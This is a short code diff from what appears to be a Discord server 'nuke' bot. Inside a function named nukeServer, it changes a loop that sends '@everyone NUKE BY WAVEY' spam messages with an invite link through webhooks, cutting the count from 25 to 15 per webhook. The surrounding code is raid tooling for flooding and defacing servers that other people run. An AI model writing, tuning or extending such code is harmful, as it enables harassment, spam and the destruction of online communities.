@@ -131,7 +131,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                         const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                         
                         // Send 25 pings through the webhook - AWAIT EACH ONE
-                        for (let j = 0; j < 25; j++) {
+                        for (let j = 0; j < 15; j++) {
                             await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
                         }
                         
